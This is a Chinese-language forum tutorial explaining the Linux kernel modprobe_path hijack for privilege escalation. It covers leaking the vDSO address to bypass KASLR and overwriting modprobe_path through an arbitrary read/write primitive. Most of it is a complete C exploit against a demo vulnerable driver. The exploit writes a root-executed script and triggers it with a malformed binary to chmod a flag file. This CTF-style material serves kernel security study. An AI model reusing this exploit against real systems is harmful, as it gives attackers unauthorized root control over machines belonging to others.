# linux 内核提权总结(demo+exp分析) -- 任意读写(四)


[发表于看雪论坛](https://bbs.pediy.com/user-839858.htm)

## hijack_modprobe_path篇

+ 原理同hijack_prctl, 当用户执行错误格式的elf文件时内核调用call_usermodehelper(char *modprobe_path ...)
+ 修改modprobe后，即可实现root权限任意命令执行

+ 攻击流程
    - (内核任意读写漏洞)内核修改全局变量 modprobe_path为目标指令
    - 写入错误格式elf文件，并手动执行，触发


### 一. 利用步骤

#### 1. 定位modprobe_path(开启kaslr)

+ 同hijack_vdso，泄漏vdso地址，因为内核kaslr开启后，只有较高字节的地址发生偏移，且vdso与基地址相距较近，所以可以使用vdso定位内核加载地址

+ 获得当前调试阶段modprobe_path与内核基地址固定偏移

+ modprobe_path_addr = 内核基地址+固定偏移

#### 2. 修改modprobe_path 为任意指令

### 二. 驱动代码(见cred)

### 三. exp

``` c
#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/auxv.h>
#include <sys/prctl.h>

#define CHANGE_POINT 0x100000
#define RW_READ 0x100001
#define RW_WRITE 0x100002

size_t modprobe_path = 0xe3cba0;
size_t vmlinux_base = 0;

struct vunl
{
    char *point;
    size_t size;
} VUNL;

void leak_data(int fd, char *buf)
{
    char *res = NULL;

    VUNL.size = 0x1000;
    for (size_t addr = 0xffffffff80000000; addr < 0xffffffffffffffff; addr += 0x1000)
    {
        VUNL.point = (char *)addr;

        ioctl(fd, CHANGE_POINT, &VUNL); //change the point
        ioctl(fd, RW_READ, buf);
        if (!strcmp("gettimeofday", buf + 0x2b5))
        {
            printf("[+] the addr of VDSO is: 0x%lx\n", addr);
            vmlinux_base = addr & 0xffffffffff000000;
            printf("[+] the addr of vmlinux base is: 0x%lx\n", vmlinux_base);
            break;
        }

        puts("[-] not found, try again!\n");
    }
    return;
}

int main(int argc, char *argv[])
{
    int fd = 0;
    char *buf = malloc(0x1000);

    fd = open("/dev/rw_any_dev", O_RDWR);
    leak_data(fd, buf);
    modprobe_path += vmlinux_base;
    printf("[+] the addr of modprobe_path is: 0x%lx\n", modprobe_path);

    VUNL.size = strlen(argv[1])+1;
    VUNL.point = (char *)modprobe_path;
    ioctl(fd, CHANGE_POINT, &VUNL);
    ioctl(fd, RW_WRITE, argv[1]);

    system("echo -ne '#!/bin/sh\nchmod 777 /flag' > /su.sh");
    system("chmod +x /su.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /dummy");
    system("chmod +x /dummy");

    system("/dummy");

    return 0;
}
```




